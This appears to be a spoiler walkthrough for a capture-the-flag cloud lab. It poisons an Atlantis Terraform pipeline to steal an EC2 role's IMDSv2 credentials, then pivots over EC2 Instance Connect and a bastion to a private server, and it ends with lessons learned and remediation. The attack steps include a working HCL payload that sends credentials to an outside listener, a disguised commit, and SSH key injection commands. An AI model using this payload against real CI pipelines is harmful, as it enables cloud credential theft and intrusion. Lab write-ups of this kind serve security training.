# Walkthrough

> **Warning:** Full spoilers ahead. Only read this if you are stuck.

## Step 1: GitLab Reconnaissance

Access the GitLab instance using the URL from Terraform output and the provided credentials.

```bash
# Get the GitLab URL from Terraform output
cd terraform
terraform output gitlab_server_url
```

Open the URL in your browser. You will see the GitLab CE login page. Log in with:
- **Username:** `platform`
- **Password:** `BvrOps@2024`

Navigate to the `infra-repo` repository and open `atlantis.yaml`.

Key finding:

```yaml
autoplan:
  enabled: true           # ← terraform plan runs on ANY MR touching .tf files
apply_requirements: [approved]   # apply requires approval, but plan does not
```

**Critical misconfiguration:** `autoplan.enabled: true` means Atlantis will execute `terraform plan` automatically on any Merge Request that modifies a `.tf` file — with no review, no approval, and no human in the loop. The `apply_requirements: [approved]` guard only protects `apply`, not `plan`. Since `terraform plan` can execute arbitrary code via `external` data sources, this is a full code execution primitive on the Atlantis runner.

> **Note:** The Atlantis runner has an IAM role attached. When `terraform plan` runs the `external` data source program, it executes directly on the runner — as if you had shell access. The instance enforces IMDSv2, but that only blocks SSRF-style attacks from an external host. Code running on the instance itself can complete the IMDSv2 token exchange and retrieve the attached role's credentials.

## Step 2: Pipeline Poisoning

Set up a listener to receive the exfiltrated credentials. Use [webhook.site](https://webhook.site) or any HTTP listener you control. Copy your unique URL.

Clone the repository and create an exploit branch:

```bash
git clone http://platform:BvrOps%402024@<GITLAB_IP>/platform/infra-repo.git
cd infra-repo
git checkout -b exploit/steal-creds
```

Append the following block to `main.tf`. Replace `<YOUR_LISTENER_URL>` with your webhook endpoint:

```hcl
data "external" "steal_creds" {
  program = ["sh", "-c", <<-EOT
    TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
    curl -s -X POST "<YOUR_LISTENER_URL>" \
      -H "Content-Type: application/json" \
      -d "$CREDS" > /dev/null 2>&1
    echo '{"status":"done"}'
  EOT
  ]
}
```

> **Note (IMDSv2):** The Atlantis runner is self-hosted on EC2 and enforces IMDSv2 (`http_tokens = "required"`). A direct `GET` to `169.254.169.254` returns `401 Unauthorized`. You must first `PUT` to obtain a session token, then include it as `X-aws-ec2-metadata-token` on subsequent requests. This is not a blocker — unlike SSRF attacks that target IMDS from an *external* server, code executing *directly on the instance* can complete the two-step exchange without restriction.

> **Note (stdout redirect):** The `> /dev/null 2>&1` redirect on the `curl` POST is critical. Without it, the HTTP response body from your listener lands on stdout. Terraform parses the stdout of an `external` data source program as JSON and expects a flat string map. If the listener returns any HTML or non-JSON body, Terraform fails with `invalid character '<' looking for beginning of value` and the plan errors out before the credentials are sent.

Commit and push the branch:

```bash
git add main.tf
git commit -m "chore: update storage config"
git push origin exploit/steal-creds
```

Open a Merge Request via the GitLab UI: `exploit/steal-creds → main`.

Within seconds of the MR being opened, Atlantis detects the `.tf` change and automatically runs `terraform plan`. Atlantis posts a comment on the MR confirming the plan was triggered.

## Step 3: Capturing IAM Credentials

Check your listener. Atlantis will POST the Atlantis runner's IAM credentials to your endpoint during the `terraform plan` execution. The JSON payload has this structure:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "IQoJb3JpZ2luX2VjEEwa...(truncated)...",
  "Expiration": "2026-05-01T03:00:00Z"
}
```

Configure the credentials on your local machine:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEEwa...(truncated)..."
export AWS_DEFAULT_REGION="us-east-1"
export AWS_PAGER=""
aws sts get-caller-identity
```

Expected output:

```json
{
    "UserId": "AROAYLHCQFX57CPVCEJCP:i-0abc123def456",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/atlantis-role-xxxxxxxx/i-0abc123def456"
}
```

Confirmed: you are now operating as the Atlantis runner's IAM role.

## Step 4: IAM Permission Enumeration

Credentials are useless without knowing what they can do. Before taking any action, enumerate every permission available to this role.

### 4.1 Identify the Credential Type

From the `sts:GetCallerIdentity` output, the ARN structure tells us immediately what we are dealing with:

```
arn:aws:sts::123456789012:assumed-role/<role-name>/<session-id>
```

This is an **assumed role** — specifically an EC2 instance role (the session ID matches an EC2 instance ID). Instance roles are attached directly to EC2 instances, which means:
- Credentials rotate automatically (temporary STS tokens)
- The role may have access to EC2-level APIs and instance metadata
- There is no MFA requirement

Extract the role name:

```bash
ROLE_NAME=$(aws sts get-caller-identity \
  --query 'Arn' --output text | cut -d'/' -f2)
echo $ROLE_NAME
# cicd-eic-pivot-atlantis-role-<scenario_id>
```

### 4.2 List Inline Policies

```bash
aws iam list-role-policies --role-name $ROLE_NAME
```

Expected output:

```json
{
    "PolicyNames": [
        "cicd-eic-pivot-atlantis-policy-<scenario_id>"
    ]
}
```

One inline policy found. Retrieve its full document:

```bash
aws iam get-role-policy \
  --role-name $ROLE_NAME \
  --policy-name cicd-eic-pivot-atlantis-policy-<scenario_id>
```

Expected output:

```json
{
    "PolicyDocument": {
        "Statement": [
            {
                "Action": ["ec2:DescribeInstances", "ec2:DescribeVpcs", "ec2:DescribeSubnets"],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": "ec2-instance-connect:SendSSHPublicKey",
                "Effect": "Allow",
                "Resource": "arn:aws:ec2:*:*:instance/*",
                "Condition": {"StringEquals": {"ec2:osuser": "ubuntu"}}
            },
            {
                "Action": ["ssm:GetParameter"],
                "Effect": "Allow",
                "Resource": "arn:aws:ssm:us-east-1:123456789012:parameter/cicd-eic-pivot-*/atlantis-gitlab-token"
            },
            {
                "Action": ["iam:ListRolePolicies", "iam:GetRolePolicy", "iam:ListAttachedRolePolicies"],
                "Effect": "Allow",
                "Resource": "arn:aws:iam::123456789012:role/cicd-eic-pivot-atlantis-role-*"
            }
        ]
    }
}
```

### 4.3 Check Attached Managed Policies

```bash
aws iam list-attached-role-policies --role-name $ROLE_NAME
```

Expected output:

```json
{
    "AttachedPolicies": []
}
```

No managed policies attached. The inline policy is the only source of permissions.

### 4.4 Attack Path Decision Tree

With the full policy document in hand, evaluate every possible path:

```
Stolen IAM Role Credentials
│
├── S3 access?
│     aws s3 ls
│     → AccessDenied ✗
│
├── Secrets Manager?
│     aws secretsmanager list-secrets
│     → AccessDenied ✗
│
├── IAM privilege escalation?
│     iam:CreatePolicyVersion / iam:AttachRolePolicy / iam:PassRole?
│     → Not in policy ✗
│
├── SSM Parameter Store?
│     aws ssm get-parameter --name ".../atlantis-gitlab-token"
│     → Returns GitLab service token ✓
│     → But scoped to one parameter, token only useful for GitLab API
│     → GitLab is the starting point we already have — dead end ✗
│
└── EC2 Instance Connect?
│     ec2:DescribeInstances on * → enumerate all instances ✓
│     ec2-instance-connect:SendSSHPublicKey on * → inject SSH key onto ANY instance ✓
│     → Valid attack path ✓ ← CHOSEN
```

**Why SSM is a dead end:** The `ssm:GetParameter` permission is scoped to the Atlantis GitLab token. Retrieving it gives you the same GitLab access you already have as `platform`. No new lateral movement.

**Why EC2 Instance Connect is the pivot:** `SendSSHPublicKey` on `Resource: "arn:aws:ec2:*:*:instance/*"` means we can inject an SSH key onto **any EC2 instance in this account** running as `ubuntu`. This is the overprivilege that opens the attack path forward.

## Step 5: EC2 Instance Connect

### 5.1 Enumerate Instances

Start by mapping out every EC2 instance in the account:

```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' \
  --output table
```

Expected output:

```
---------------------------------------------------------------------
|                       DescribeInstances                           |
+----------------------+---------------+---------------+----------------------------+
|  i-0aaa111bbb222ccc3 |  3.92.X.X     |  10.0.1.7     |  *-bastion-host-*          |
|  i-0ddd444eee555fff6 |  None         |  10.0.2.15    |  *-app-prod-*              |
|  i-0ggg777hhh888iii9 |  54.80.X.X    |  10.0.1.20    |  *-gitlab-server-*         |
|  i-0jjj000kkk111lll2 |  18.X.X.X     |  10.0.1.10    |  *-atlantis-runner-*       |
+----------------------+---------------+---------------+----------------------------+
```

### 5.2 Target Selection Decision Tree

Four instances visible. Decide which to attack first:

```
Instances found
│
├── *-gitlab-server-* (public IP)
│     Already have access as platform — no new value ✗
│
├── *-atlantis-runner-* (public IP)
│     This is the machine whose credentials we just stole
│     Gaining shell here adds nothing new ✗
│
├── *-app-prod-* (NO public IP — private subnet)
│     EIC push key → try direct SSH to private IP?
│     → Private IP only, unreachable from internet ✗
│     → Need a pivot point inside the VPC first
│
└── *-bastion-host-* (public IP, in public subnet)
      EIC push key → SSH directly ✓
      Once inside the VPC, can reach the private subnet ✓
      → ATTACK HERE FIRST ← CHOSEN
```

**Why not hit the target directly:** The target server has no public IP — it sits in a private subnet with no internet-facing route. Even though we can inject an SSH key via EIC, there is no network path to connect to it from outside. We need to land on a host inside the VPC first.

**Why the Bastion:** It is the only instance with both a public IP and a network path into the private subnet. It is literally named "bastion" — its purpose is to serve as the jump host.

Generate a throwaway SSH key pair:

```bash
ssh-keygen -t ed25519 -f /tmp/eic-key -N ""
```

Retrieve the Bastion Host's Availability Zone and push your public key:

```bash
AZ=$(aws ec2 describe-instances --instance-ids <BASTION_INSTANCE_ID> \
  --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text)

aws ec2-instance-connect send-ssh-public-key \
  --instance-id <BASTION_INSTANCE_ID> \
  --instance-os-user ubuntu \
  --availability-zone $AZ \
  --ssh-public-key file:///tmp/eic-key.pub
```

> **Warning:** The injected public key is valid for only **60 seconds**. SSH in immediately after the `send-ssh-public-key` call succeeds.

```bash
ssh -i /tmp/eic-key ubuntu@<BASTION_PUBLIC_IP>
```

## Step 6: Lateral Movement

You are now on the Bastion Host. List the home directory:

```bash
ls -la /home/ubuntu/
```

Expected output:

```
total 20
drwxr-xr-x 3 ubuntu ubuntu 4096 May  1 00:00 .
drwxr-xr-x 3 root   root   4096 May  1 00:00 ..
drwx------ 2 ubuntu ubuntu 4096 May  1 00:00 .ssh
-r-------- 1 ubuntu ubuntu 1679 May  1 00:00 target-key.pem
```

If you read `docs/adr/0003-deploy-pipeline.md` during recon, this is familiar: the original SSH deploy key that predated the EIC adoption. PLAT-1203 was supposed to clean it up. It never did.

> **Note:** The Bastion Host does not have AWS CLI installed. Retrieve the Target Server's private IP from your **local machine** using the stolen credentials:

```bash
aws ec2 describe-instances --instance-ids <TARGET_INSTANCE_ID> \
  --query 'Reservations[0].Instances[0].PrivateIpAddress' --output text
```

SSH from the Bastion Host into the Target Server:

```bash
ssh -i /home/ubuntu/target-key.pem ubuntu@<TARGET_SERVER_PRIVATE_IP>
```

## Step 7: Capture the Flag

```bash
cat /home/ubuntu/flag.txt
```

Output:

```
FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex>}
```

---

## Attack Chain Summary

```
1. GitLab Reconnaissance (platform account)
   ↓ Discover infra-repo — atlantis.yaml has autoplan.enabled: true
2. Pipeline Poisoning
   ↓ Inject external data source into main.tf on new branch, push, open MR
3. Atlantis autoplan triggered
   ↓ Terraform plan runs the malicious shell program on the Atlantis runner
4. IMDS Credential Theft (IMDSv2 token exchange via 169.254.169.254)
   ↓ Credentials POSTed to external listener — AccessKeyId, SecretAccessKey, Token
5. sts:GetCallerIdentity
   ↓ Confirm identity: assumed-role/atlantis-role — extract role name
6. iam:ListRolePolicies + iam:GetRolePolicy
   ↓ Inline policy reveals: DescribeInstances, SendSSHPublicKey on *, ssm:GetParameter (scoped)
7. iam:ListAttachedRolePolicies
   ↓ No managed policies — inline policy is the only source of permissions
8. Evaluate attack paths: S3 ✗, Secrets Manager ✗, IAM escalation ✗, SSM (dead end) ✗
   ↓ ec2-instance-connect:SendSSHPublicKey on * → chosen path
9. ec2:DescribeInstances
   ↓ Find bastion-host (public IP) and app-prod (private subnet, no public IP)
10. Target selection: target unreachable directly → bastion is the pivot point
    ↓ EIC to bastion first
11. ec2-instance-connect:SendSSHPublicKey → Bastion Host (60s window)
    ↓ Throwaway ed25519 key injected into authorized_keys
12. SSH into Bastion Host
    ↓ Discover target-key.pem at /home/ubuntu/
13. ec2:DescribeInstances (from local machine — bastion has no AWS CLI)
    ↓ Retrieve Target Server private IP
14. SSH into Target Server via Bastion (target-key.pem)
    ↓
15. FLAG{SUPPLY_CHAIN_EIC_SUCCESS_<hex>}
```

---

## Key Techniques

### IMDSv1 vs IMDSv2

| | IMDSv1 | IMDSv2 |
|---|---|---|
| Token requirement | None — direct GET | Requires PUT to get a session token first |
| SSRF protection | None | Token blocks most SSRF attacks |
| Curl command | `curl http://169.254.169.254/...` | Requires `-H "X-aws-ec2-metadata-token: $TOKEN"` |
| Terraform external data source | Exploitable directly | Requires two-step token fetch in the program |
| Enforce via Terraform | `http_tokens = "optional"` (default, vulnerable) | `http_tokens = "required"` — blocks SSRF, but **not** code execution on the instance |

### EC2 Instance Connect vs Traditional SSH Key Management

| | EC2 Instance Connect | Traditional SSH Keys |
|---|---|---|
| Key distribution | API call pushes key temporarily (60s TTL) | Pre-shared keys baked into AMI or provisioned at launch |
| Revocation | Automatic — key expires after 60 seconds | Manual — requires removing from `authorized_keys` |
| Audit trail | CloudTrail logs `SendSSHPublicKey` API call | No AWS-level audit unless logged at OS level |
| Attack surface | Requires `ec2-instance-connect:SendSSHPublicKey` IAM permission | Requires possession of the private key file |
| Overprivilege risk | `Resource: "*"` grants access to all instances in account | Key compromise grants access only to instances with that key |

---

## Lessons Learned

### 1. CI/CD Authorization: Autoplan Without Approval Gates

`autoplan.enabled: true` combined with `apply_requirements: [approved]` creates a false sense of security. Apply is gated, but plan is not — and `terraform plan` is arbitrary code execution on the runner via `external` data sources, `local-exec` provisioners, and provider initialization. **Fix:** Require approval on plan too, or disable autoplan and require explicit `atlantis plan` comments from authorized users.

### 2. IMDS Hardening: IMDSv2 Alone Is Not Enough

Enforcing IMDSv2 (`http_tokens = "required"`) blocks SSRF-style attacks where an external server is tricked into fetching `169.254.169.254`. However, it does **not** protect against credential theft when an attacker already has code execution *on the instance* — which is exactly what `terraform plan` with an `external` data source provides. IMDSv2 is a necessary hardening step, but it does not replace the need to prevent unauthorized code execution in the first place.

### 3. Least Privilege: Scope SendSSHPublicKey to Specific Instances

Granting `ec2-instance-connect:SendSSHPublicKey` with `Resource: "*"` allows the principal to inject SSH access onto any EC2 instance in the account. Scope the permission to specific instance ARNs or use condition keys (`ec2:ResourceTag`) to restrict to instances that legitimately need it.

### 4. Credential Hygiene: Do Not Leave SSH Keys on Bastion Hosts

The `target-key.pem` on the Bastion Host allowed a single-step pivot into the private subnet. Bastion Hosts should not store long-lived credentials. Use EC2 Instance Connect or SSM Session Manager for all access to private instances — no key files on disk, no lateral movement vector.

---

## Remediation

### Atlantis Configuration: Require Approval on Plan

```yaml
# atlantis.yaml — safe configuration
version: 3
projects:
  - name: infra
    dir: .
    autoplan:
      enabled: false            # disable autoplan entirely
    apply_requirements:
      - approved
    plan_requirements:
      - approved                # gate plan as well as apply
```

Or, if autoplan is required, restrict which users can trigger it with an `allowed_regexp` on branch names and enforce `plan_requirements`.

### Terraform: Enforce IMDSv2 on All EC2 Instances

```hcl
resource "aws_instance" "atlantis" {
  # ...
  metadata_options {
    http_tokens                 = "required"   # enforce IMDSv2
    http_put_response_hop_limit = 1
    http_endpoint               = "enabled"
  }
}
```

### IAM: Scope SendSSHPublicKey to Specific Instances

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "ec2-instance-connect:SendSSHPublicKey",
      "Resource": "arn:aws:ec2:us-east-1:123456789012:instance/i-0specific1instance2id",
      "Condition": {
        "StringEquals": {
          "ec2:osuser": "ubuntu"
        }
      }
    }
  ]
}
```
